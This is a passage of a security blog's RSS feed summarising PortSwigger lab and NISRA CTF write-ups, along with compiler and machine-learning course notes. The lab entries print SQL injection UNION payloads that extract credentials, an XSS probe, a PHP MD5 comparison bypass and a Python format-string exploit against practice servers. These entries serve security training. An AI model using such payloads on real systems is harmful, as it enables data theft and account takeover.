To solve the lab, exfiltrate the contents of the /etc/hostname file. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator’s default public server. Recon Use the previous method :::spoiler Payload</description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html</guid><description>Lab: Exploiting blind XXE to retrieve data via error messages tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. Goal: To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD. Recon This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)</description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html</guid><description>Lab: Exploiting Java deserialization with Apache Commons tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don’t have source code access, you can still exploit this lab using pre-built gadget chains. Goal: To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peter Background ysoserial使用方法</description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html</guid><description>Lab: Exploiting XXE via image file upload tags: Portswigger Web Security Academy Web Description: This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. Goal: To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the “Submit solution” button to submit the value of the server hostname. Recon In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.</description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html</guid><description>Lab: Modifying serialized data types tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos. You can log in to your own account using the following credentials: wiener:peter Background Loose Comparison Operator in PHP
PHP based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator(==) when comparing different data types. For example: 5=="5" will be true when two types are different.</description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html</guid><description>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four: tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Exp Determine # of columns Payload: ?category=Gifts' union select NULL,NULL --</description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html</guid><description>Lab: SQL injection attack, listing the database contents on Oracle tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual Exp Determine # of columns Payload: ?category=Lifestyle' union select NULL,NULL from dual--</description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html</guid><description>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft tags: Portswigger Web Security Academy Web Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Goal: To solve the lab, display the database version string. Exp Consider # of column Payload: ?category=Accessories' union select NULL,NULL -- # Consider column type Payload: ?category=Accessories' union select 'a','a' -- # Both of them contained text. Attack Payload: ?category=Accessories' union select 'abc',@@version -- # :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html</guid><description>Lab: SQL injection attack, querying the database type and version on Oracle tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Our Goal: To solve the lab, display the database version string. Exp - SQLi Cheat Sheet - Examining the database in SQL injection attacks According to the cheat sheet above, we can use the command to fetch the version of this database, e.g. :::warning Before the recon, the hint told you that this database is created by Oracle. So, you must contained From preserved word in each query, e.g. SELECT 'abc' FROM dual :::</description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html</guid><description>Lab: SQL injection UNION attack, determining the number of columns returned by the query tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. Hint: To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. Exp Payload: https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL-- :::spoiler Success Screenshot :::</description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html</guid><description>Lab: SQL injection UNION attack, finding a column containing text tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. Exp Determine how many columns it has You can use the technique from previous question. Payload: ?category=' UNION SELECT NULL,NULL,NULL--</description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html</guid><description>Lab: SQL injection UNION attack, retrieving data from other tables tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp Using all technique we learned before According to union-based technique we learned before, we can consider there’re 2 columns in this database and both of them are text strings Payload: ?category=Lifestyle' UNION SELECT 'Title name','Post content'-- Find the detailed info in users table Payload: ?category=Lifestyle' UNION SELECT username, password FROM users-- Login as administrator Username: administrator Password: 5kg73b7jinl9plif82d3 :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html</guid><description>Lab: SQL injection UNION attack, retrieving multiple values in a single column tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp Consider how many columns in this table Payload: ?category=Lifestyle' UNION SELECT NULL,NULL-- Consider the type of each columns Payload: ?category=Lifestyle' UNION SELECT 1,'a'-- As the payload above, the 1st column is number-based string, and 2nd column is text-based string. :::spoiler Result ::: 通靈: Find username and password From the result above, there’s just one column is text-based string that we can inject, so we can use concatenate operator || to concatenate two strings that we query together. Payload: ?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users-- :::spoiler Result ::: Login by username and password that we fetch :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html</guid><description>Lab: Stored DOM XSS tags: Portswigger Web Security Academy Web Description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality. Goal: To solve this lab, exploit this vulnerability to call the alert() function. Recon Find the injected place According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.
Try to inject Comment Payload: &lt;script>alert(123)&lt;/script> Seems weird, and when you browse the page source, you’ll find out that it calls external js files to import the comment, i.e.:</description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html</guid><description>Lab: Using application functionality to exploit insecure deserialization tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.
Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory.
You can log in to your own account using the following credentials: wiener:peter You also have access to a backup account: gregg:rosebud</description></item><item><title>Machine Learning Hand-write Homework &amp; Answer</title><link>https://bernie6401.github.io/security/course/ntu-ml/machine-learning-hand-write-homework--answer/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ml/machine-learning-hand-write-homework--answer/index.html</guid><description>Machine Learning Hand-write Homework &amp; Answer tags: NTU_ML Machine Learning HW1 HW1-Ans HW2 HW2-Ans HW3 HW3-Ans HW4 HW4-Ans</description></item><item><title>NISRA - different places</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---different-places/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---different-places/index.html</guid><description>NISRA - different places tags: NISRA CTF Web Challenge: different places
Exploit - Integrate Fragments Flags View Page Sources base64 decode dXNlcm5hbWU6YWRtaW5fcGFzc3dvcmQ6bmlzcmE= $\to$ username:admin_password:nisra
Observe the form It uses get method to fetch the parameters. So we can peek login.php first. Then we could use the username and password we got at previous step. Payload: view-source:http://chall2.nisra.net:41025/login.php?username=admin&amp;password=nisra Then we got the last fragment flag.</description></item><item><title>NISRA - Hidden?</title><link>https://bernie6401.github.io/security/practice/nisra/misc/nisra---hidden_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/misc/nisra---hidden_/index.html</guid><description>NISRA - Hidden? Background advanced-potion-making:two::+1:
Recon 這一題也是蠻巧妙的，用pngcheck可以看到檔案有問題
$ pngcheck haha.png haha.png additional data after IEND chunk ERROR: haha.png Exploit - Recover + Unzip Recover PNG File 先找文件尾（00 00 00 00 49 45 4E 44 AE 42 60 82） 發現後續還有其他bytes，用list signature追查後面是甚麼， 發現應該是個zip file，所以獨立出來後解壓縮
Unzip 解壓縮後有一些文件，從裡面撈了一下flag就在./word/document.xml中 Flag: NISRA{Oop5!_yoU_fOuNd_1t}</description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_1/index.html</guid><description>NISRA - MD5_1 tags: NISRA CTF Web Challenge: MD5_1
Source code &lt;?php highlight_file(__FILE__); $FROM_INCLUDE = true; include("flag.php"); $msg = ""; if (isset($_GET['user']) &amp;&amp; isset($_GET['password'])) { $user = $_GET['user']; $password = $_GET['password']; $check = "QNKCDZO"; // the md5 of "QNKCDZO" is 0e830400451993494058024219903391 if ($user == "admin" &amp;&amp; $password != $check &amp;&amp; md5($password) == md5($check)) { $msg = "Flag: ".$flag; } else { $msg = "Keep trying!"; } } echo $msg; ?> Exploit - MD5 Collision Payload: http://chall2.nisra.net:41022/?user=admin&amp;password=240610708 :::spoiler flag Flag: NISRA{PhP_is_th3_BeST_laNgUA9E} :::</description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_2/index.html</guid><description>NISRA - MD5_2 Exploit Payload: curl http://chall2.nisra.net:41023/ -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "user=240610708&amp;password=QNKCDZO" Flag: NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}
Reference md5(‘240610708’) == md5(‘QNKCDZO’)</description></item><item><title>NISRA 2023 Enlightened - Jack的flag</title><link>https://bernie6401.github.io/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/index.html</guid><description>NISRA 2023 Enlightened - Jack的flag Background Microsoft Word Forensics
Recon 這是第一次寫到有關word的隱寫，蠻特別的就紀錄一下，但看得出來應該是考古古古古古古題了ㄅ
Exploit 有兩種方法
強制解壓縮 直接把副檔名改成.zip，然後用解壓縮軟體解壓縮，接著就可以在Final-Jack\word\document.xml中可以找到flag 把隱藏設定打開 直接在word中的檔案/選項/顯示/隱藏文字的方塊打勾，就可以直接在下面看到flag了 Flag: NISRA{Word'$_h1Dden_7eXT_reVEaLed}</description></item><item><title>NISRA 2023 Enlightened - Magic Function</title><link>https://bernie6401.github.io/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/index.html</guid><description>NISRA 2023 Enlightened - Magic Function Background Magic Function of Python
Source Code class Test(): def __init__(self, email='test@nisra.net'): self.info = 'test' self.email = email class Secret(): flag = open("./NISRA-Enlightened-2023/flag.txt", "r").read().strip() if __name__ == '__main__': email = input('Your email: ') if email: test = Test(email) else: test = Test() msg = ('this is for {test.info}, please contact ' + email + '.').format(test=test) print(msg) Recon 這一題真的很有趣，但也是算通靈的奇淫怪招，仔細看了一下直覺應該是跟format string有關係，比賽的時候的確有想到，但我當時想的payload有點偏掉了，當時的payload是: {test.email}.format(test=Test(Secret().flag))，也就是先傳入Secret().flag給Test這個class，然後再利用format傳入給
Exploit $ echo "{test.__init__.__globals__[Secret].flag}" | nc chall2.nisra.net 43001 Your email: this is for test, please contact NISRA{Ma9ic_pY3h0n_!!???}. Flag: NISRA{Ma9ic_pY3h0n_!!???}</description></item><item><title>NISRA 2023 Enlightened - Pixel</title><link>https://bernie6401.github.io/security/practice/nisra/misc/nisra-2023-enlightened---pixel/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/misc/nisra-2023-enlightened---pixel/index.html</guid><description>NISRA 2023 Enlightened - Pixel Source Code Recon 這一題真的很難，應該說有想過，不過很麻煩就是了，每一個色塊都有一組RGB的數值，然後只要把它轉換成ASCII，再把每一個字元串起來，就會是一組base64的code，轉換之後就拿到一組ciphertext，接著就丟到cyberchef看看一般的工具可不可以解，最後是用rot13解出來，除了最一開始的地方需要一點通靈之外，其他都很簡單，但…寫script頗麻煩
Exploit from PIL import Image from base64 import b64decode img = Image.open("./NISRA-Enlightened-2023/Misc/Final-Pixel.png") pixels = [] for row in range(8):	# 8 rows for col in range(8):	# 8 columns r, g, b = img.getpixel((row * 64 + 1, col * 64 + 1))	# each grid: 64 x 64 if r == 255 and g == 255 and b == 255: break else: pixels.append((chr(r), chr(g), chr(b))) if r == 255 and g == 255 and b == 255: break flag = "" print(pixels) for r, g, b in pixels: flag += r + g + b print(flag) print(b64decode(flag.encode())) $ python exp.py [('c', '3', 'l'), ('u', 'd', 'D'), ('o', 'g', 'Q'), ('V', 'Z', 'G'), ('R', 'U', '5'), ('7', 'T', 'l'), ('9', 'l', 'T'), ('m', 'Y', '3'), ('U', 'k', 'V'), ('f', 'N', 'k'), ('U', '0', 'Q'), ('1', 'U', 'x'), ('U', 'F', '9'), ('l', 'U', 'm'), ('N', 'F', 'U'), ('m', 'Z', 'S'), ('Q', 'W', 'c'), ('k', 'X', '0'), ('5', 'f', 'R'), ('2', 'o', 'w'), ('L', 'V', 'E'), ('x', 'W', 'j'), ('N', 'h', 'Z'), ('j', 'E', 'w'), ('Y', 'T', 'Q'), ('x', 'X', '2'), ('N', '2', 'c'), ('G', 'd', 'o'), ('R', 'X', 'J'), ('f', 'T', 'm'), ('Z', 'f', 'N'), ('F', '9', 'l'), ('U', 'n', 'B'), ('H', 'b', 'm'), ('E', '2', 'S'), ('D', 'F', 'O'), ('R', 'V', '9'), ('a', 'b', 'j'), ('d', 'l', 'd'), ('m', 't', 'f'), ('Y', 'm', 'V'), ('f', 'd', 'G'), ('V', 'W', 'c'), ('V', '9', 'i'), ('U', '1', '9'), ('G', 'Z', 'E'), ('h', 'A', 'Z'), ('V', 'J', 'f'), ('Q', '1', 'Z'), ('L', 'c', 'n'), ('l', 'm', 'f'), ('Q', '=', '=')] c3ludDogQVZGRU57Tl9lTmY3UkVfNkU0Q1UxUF9lUmNFUmZSQWckX05fR2owLVExWjNhZjEwYTQxX2N2cGdoRXJfTmZfNF9lUnBHbmE2SDFORV9abjdldmtfYmVfdGVWcV9iU19GZEhAZVJfQ1ZLcnlmfQ== b'synt: AVFEN{N_eNf7RE_6E4CU1P_eRcERfRAg$_N_Gj0-Q1Z3af10a41_cvpghEr_Nf_4_eRpGna6H1NE_Zn7evk_be_teVq_bS_FdH@eR_CVKryf}' Flag: NISRA{A_rAs7ER_6R4PH1C_rEpREsENt$_A_Tw0-D1M3ns10n41_pictuRe_As_4_rEcTan6U1AR_Ma7rix_or_grId_oF_SqU@rE_PIXels}</description></item><item><title>NTU CNS Final Project Proposal</title><link>https://bernie6401.github.io/security/course/ntu-cns/ntu-cns-final-project-proposal/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/ntu-cns-final-project-proposal/index.html</guid><description>NTU CNS Final Project Proposal tags: NTUCNS Problem description / Research question(秉學) Terminology Federated Learning is a decentralized machine learning method that enables training models without exposing data. Traditional machine learning methods require all data to be centralized in one location for training, but Federated Learning enables models to be trained on many distributed devices, such as smartphones, tablets, or embedded devices, with each device training its own local data. This greatly reduces data transmission and storage requirements and better protects user privacy.</description></item><item><title>NTU Compiler Technology Previous Exam 2019 Spring</title><link>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/index.html</guid><description>NTU Compiler Technology Previous Exam 2019 Spring tags: NTU_CT NTU Compiler Techonology of Programming Language Final Exam Please explain three different compiler optimization techniques : (a) 1st compiler optimization technique: (5points/5) (b) 2nd compiler optimization technique: (5points/10) (c) 3rd compiler optimization techniques: (5points/15)
Many computer systems provide an interactive debugger (for example, gdb or db x) to assist users in diagnosing and correcting runtime errors. Although a debugger is run long after a compiler has done its job, the two tools still must cooperate. What information (beyond the translation of a program) must a compiler supply to support effective runtime debugging? (5 points/20)</description></item><item><title>NTU Compiler Technology Previous Exam 2020 Spring</title><link>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/index.html</guid><description>NTU Compiler Technology Previous Exam 2020 Spring tags: NTU_CT NTU Compiler Techonology of Programming Language Final Exam According to the grammar of AC in the right , please write down the recursive descent parsing procedure for nonterminal Expr. (10 points/10) Please write down a regular expression that defines the set of strings recognized by the FA in the following and explain your answer (5points/ 15)</description></item><item><title>NTU Compiler Technology Project 1</title><link>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-1/index.html</guid><description>NTU Compiler Technology Project 1 tags: NTU_CT NTU Compiler Techonology of Programming Language AcDc Compiler Description This is a project from NTU (National Taiwan University) course, Compiler Technology of Programming Language. First project is aim to add multiplier and division operation in this compiler let compiler can recognize multi character identifier(variable) name by alphabet string use constant folding to optimize the statement How to use? You can browse Assignment1.pdf. You must run in Linux OS environment(more conveniently). When you finish the coding, use $ make command directly. $ ./AcDc &lt;input sample address> &lt;output file address> For instance: $ ./AcDc ../test/sample1.ac ./output Something need to know first It can not recognize the bottom line as identifier name. It can not print negative value like $1-2=-1$ expression. Actually speaking, it can calculate correctly but it can not print it out.(I’ll check it out later.) You can check constfold testbench Solution and Why: In Dc Language, the bottom line represent negative symbol. You can not just use minus as negative symbol, replace it by bottom line instead. It can not recognize identifier name with numbers. You can check longname.ac The other testbenchs can compile from Ac language to Dc language correctly. Reference AcDc AcDcCompiler</description></item><item><title>NTU Compiler Technology Project 2</title><link>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-2/index.html</guid><description>NTU Compiler Technology Project 2 tags: NTU_CT NTU Compiler Techonology of Programming Language Scanner :::spoiler [TOC] :::
Objective This is compiler project 2 that aim to construct the scanner by handmade with some sample code. The output is symbol table that the frequency of each identifier and the result is sorted.
Run and Test $ make /*use make in src folder*/ $ ./scanner ../test/sample1.ac Output of each sample For sample1.ac</description></item><item><title>NTU Compiler Technology Project 3</title><link>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-3/index.html</guid><description>NTU Compiler Technology Project 3 tags: NTU_CT NTU Compiler Techonology of Programming Language YACC Lex [TOC]
Objective The main task for this project is to revise src/parser.y and generate parser file properly to compile test code in test folder. And then use Graphviz command to visualize the structure of these test code How to run? Just use make to compile all files in /src. Though you’ll get a lots of warning shown as below, you can ignore them and obtain the target file parser. bison -v -d parser.y parser.y: warning: 1 shift/reduce conflict [-Wconflicts-sr] flex lexer.l gcc -g -c alloc.c gcc -g -c parser.tab.c parser.tab.c: In function ‘yyparse’: parser.tab.c:2565:7: warning: implicit declaration of function ‘yyerror’; did you mean ‘yyerrok’? [-Wimplicit-function-declaration] yyerror (YY_("syntax error")); ^~~~~~~ yyerrok parser.y: At top level: parser.y:825:3: warning: data definition has no type or storage class yydebug = 1; ^~~~~~~ parser.y:825:3: warning: type defaults to ‘int’ in declaration of ‘yydebug’ [-Wimplicit-int] parser.y:827:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main (argc, argv) ^~~~ parser.y: In function ‘main’: parser.y:834:5: warning: implicit declaration of function ‘printGV’; did you mean ‘printf’? [-Wimplicit-function-declaration] printGV(prog, NULL); ^~~~~~~ printf gcc -g -c functions.c gcc -g -o parser parser.tab.o alloc.o functions.o -lfl Use parser to compile all files in /test folder and you will get AST_Graph.gv in /test folder. /src ./parser ../test/control.c dot -Tpng -o ../test/control.png ../test/AST_Graph.gv ./parser ../test/decl.c dot -Tpng -o ../test/decl.png ../test/AST_Graph.gv ./parser ../test/expr.c dot -Tpng -o ../test/expr.png ../test/AST_Graph.gv ./parser ../test/func.c dot -Tpng -o ../test/func.png ../test/AST_Graph.gv Note that in parser.y, I set yydebug = 1 so that we can see the debug message from parser #ifdef YYDEBUG yydebug = 1; #endif For TA I changed a little bit functions.c that will generate AST_Graph.gv at test/ folder. void printGV(AST_NODE *root, char* fileName) { if (fileName == NULL) { fileName = "../test/AST_Graph.gv"; } ... } Analysis You can see the relationship between structure map and test code by yourself. control.c int main() { int i; int p; int k, j; for (i=0; i&lt;9; i=i+1) { /* empty */ } for (i=0, p=4+4; i&lt;9; i=i+1, p=i) { write("test"); } for (;;) { /*empty*/ } while (1) { } while (2) { write("haha"); write("wow"); } if (k == j) { write("first"); } if (k == j) { write("first"); } else if (j == k) { write("second"); } else { write("third"); } } decl.c typedef float GFLOAT; int main() { typedef int INT, INT2, INT3; typedef float FLOAT; typedef void VOID; typedef void VOID2, VOID3; INT f[3][3*3-(4+2)/2]; FLOAT f2; } expr.c int fn1() { return 1; } float fn3() { return 1.0; } int fn4(int a, int b) { return 1; } int expr(int a, int b, int c, int d, float fa, float fb, float fc) { int i, j, k, l; float fi = 1.0, fj = 2.0, fk = 3.0, fl = 4.0; fi = 1.2*fi + -fj * (fl - fk * fn3()); fi = -fn3() -(-(-(4))); fi = !fn3() -(!(!(4))); i = !fn1(); i = 1 &lt; 2; i = 1 > 2; i = 1 >= 2; i = 1 &lt;= 2; i = 1 != 2; i = 1 == 2; i = fn4(1+3*4*fn4(2,3), 3); return 1; } int main() { } func.c int fn1() { int ABC = 5; return ABC+5; } void fn2() { } void fn3(int a, int b[3][4]) { } int main() { int b[4][4]; fn1(); fn2(); fn3(2, b); } Reference Github example Simple intro of yacc &amp; lex Simple intro of Graphviz A GUIDE TO LEX &amp; YACC from TA 大推：以lex/yacc實作算式計算機</description></item><item><title>NTU Compiler Technology Project 4</title><link>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 